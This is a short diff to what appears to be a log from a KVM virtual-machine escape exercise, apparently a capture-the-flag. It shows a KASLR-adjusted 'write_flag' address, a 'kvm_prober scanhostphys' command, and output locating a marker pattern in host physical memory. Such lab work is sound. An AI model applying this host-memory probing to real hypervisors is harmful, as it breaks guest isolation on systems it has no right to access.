@@ -41,3 +41,8 @@ write_flag address w/ KASLR: 0x026279a8
 kvm_prober scanhostphys 0xf6279a8 0x777f72b5ee00 4096 --gold
 
 [*] hpa 2 gpa = 0x3B000000
+
+
+[GOLD] Found HEX pattern '44434241efbeadde' at offset 0x37c (addr 0x632cf9a8)
+Hex context: 0000000000000000100000000000000044434241EFBEADDE00000000000000000000000000000000
+ASCII context: ................DCBA....................
